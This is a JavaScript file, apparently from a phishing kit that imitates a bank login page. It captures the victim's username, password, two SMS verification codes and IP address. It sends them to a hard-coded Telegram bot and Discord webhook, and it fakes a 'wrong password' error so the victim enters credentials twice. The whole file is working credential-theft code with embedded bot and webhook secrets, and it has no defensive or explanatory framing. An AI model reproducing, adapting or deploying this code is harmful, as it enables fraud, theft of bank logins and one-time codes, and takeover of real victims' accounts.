// tg.js - Versión mejorada para manejar 3 formularios diferentes
async function handleFormSubmit(event) {
    event.preventDefault();
    
    // Obtener IP del usuario
    let ip = 'Desconocida';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip;
    } catch (error) {
        console.error('Error al obtener IP:', error);
    }

    // Determinar qué formulario se está enviando
    const formType = document.getElementById('username') ? 'login' : 
                    document.getElementById('smsCode') ? 'sms1' : 
                    document.getElementById('sms2Code') ? 'sms2' : 'unknown';
    
    let message = '';
    let discordContent = '';
    let redirectUrl = '';
    
    switch(formType) {
        case 'login':
            // Formulario de login (index.html)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            message = `📨 BDV4RES capturado:\n\n🆔 Usuario: ${username}\n🎭 Contraseña: ${password}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Usuario:** ${username}\n**Contraseña:** ${password}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            
            // Verificar si ya es el segundo intento
            const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
            redirectUrl = isSecondAttempt ? 'w1.html' : '';
            break;
            
        case 'sms1':
            // Primer formulario de SMS (sms.html)
            const codigo1 = document.getElementById('smsCode').value;
            
            message = `📨 BDV4RES capturado:\n\n💬 CODIGO1: ${codigo1}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Código SMS 1:** ${codigo1}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            redirectUrl = 'w2.html';
            break;
            
        case 'sms2':
            // Segundo formulario de SMS (sms2.html)
            const codigo2 = document.getElementById('sms2Code').value;
            
            message = `📨 BDV4RES capturado:\n\n💬 CODIGO2: ${codigo2}\n🌐 IP: ${ip}\n💀 4RES565`;
            discordContent = `📨 **BDV4RES CAPTURADO**\n\n**Código SMS 2:** ${codigo2}\n**IP:** ${ip}\n**Marca:** 4RES565`;
            redirectUrl = 'w2.html';
            break;
            
        default:
            console.error('Tipo de formulario no reconocido');
            // Mostrar error en la página si existe el elemento
            const errorElement = document.getElementById('errorMessage');
            if (errorElement) {
                errorElement.textContent = 'Error en el sistema. Por favor intente nuevamente.';
                errorElement.style.display = 'block';
            }
            return false;
    }

    // Configuración del bot de Telegram
    const botToken = '7207232429:AAEsTg-EA9tSCaJYazHEqA-lvOfldZTczNU';
    const chatId = '-1002548985972';
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Webhook de Discord proporcionado
    const discordWebhookUrl = 'https://discord.com/api/webhooks/1428574338407338044/kgInd80Z5u0ntymDUvJg7wiwe6b2c1LueLE3TSjtyPGQqYTihC1LyTuLDLBY1fpNET0o';

    try {
        // Enviar los datos a Discord y Telegram
        const discordPromise = fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: discordContent,
                username: 'BDV4RES Logger',
                avatar_url: 'https://cdn-icons-png.flaticon.com/512/3067/3067256.png',
                embeds: [{
                    title: `📨 Nuevo Captura BDV4RES - ${formType.toUpperCase()}`,
                    description: `**Tipo:** ${formType}\n**IP:** ${ip}\n**Fecha:** ${new Date().toLocaleString()}`,
                    color: 16711680, // Rojo
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Sistema BDV4RES - 4RES565'
                    }
                }]
            })
        });

        const telegramPromise = fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        // Enviar ambas solicitudes en paralelo
        const [discordResponse, telegramResponse] = await Promise.all([discordPromise, telegramPromise]);
        
        // Verificar respuestas
        const telegramData = await telegramResponse.json();
        const discordOk = discordResponse.ok;
        
        if (telegramData.ok || discordOk) {
            console.log('Datos enviados correctamente');
            
            // Manejar redirección solo para el formulario de login
            if (formType === 'login') {
                const isSecondAttempt = sessionStorage.getItem('bdv_first_attempt') === 'completed';
                
                if (isSecondAttempt) {
                    // Es el segundo intento, redirigir
                    sessionStorage.removeItem('bdv_first_attempt'); // Limpiar para futuros intentos
                    window.location.href = redirectUrl;
                } else {
                    // Es el primer intento, marcar como completado y mostrar error
                    sessionStorage.setItem('bdv_first_attempt', 'completed');
                    
                    // Mostrar mensaje de error en la página
                    const errorElement = document.getElementById('errorMessage');
                    if (errorElement) {
                        errorElement.textContent = 'Usuario y/o contraseña incorrectos. Por favor, intente nuevamente.';
                        errorElement.style.display = 'block';
                        
                        // Añadir animación
                        errorElement.style.animation = 'none';
                        setTimeout(() => {
                            errorElement.style.animation = 'shake 0.5s ease-in-out';
                        }, 10);
                    }
                    
                    // Limpiar campos
                    document.getElementById('username').value = '';
                    document.getElementById('password').value = '';
                    
                    // Añadir clases de error a los inputs
                    document.getElementById('username').classList.add('input-error');
                    document.getElementById('password').classList.add('input-error');
                    
                    // Enfocar en el primer campo
                    document.getElementById('username').focus();
                    
                    // Cambiar mensaje del botón
                    const submitBtn = document.querySelector('.submit-btn');
                    if (submitBtn) {
                        submitBtn.textContent = 'Reintentar';
                    }
                }
            } else {
                // Para otros formularios, redirigir normalmente
                if (redirectUrl) {
                    window.location.href = redirectUrl;
                }
            }
        } else {
            console.error('Error en las respuestas:', {
                telegram: telegramData,
                discord: discordResponse.status
            });
            // Mostrar error en la página
            const errorElement = document.getElementById('errorMessage');
            if (errorElement) {
                errorElement.textContent = 'Error de conexión. Por favor intente nuevamente.';
                errorElement.style.display = 'block';
            }
        }
    } catch (error) {
        console.error('Error al enviar los datos:', error);
        // Mostrar error en la página
        const errorElement = document.getElementById('errorMessage');
        if (errorElement) {
            errorElement.textContent = 'Error de conexión. Por favor intente nuevamente.';
            errorElement.style.display = 'block';
        }
    }

    return false;
}

// Función específica para sms2.html (alternativa)
async function handleSms2Submit(event) {
    return handleFormSubmit(event);
}
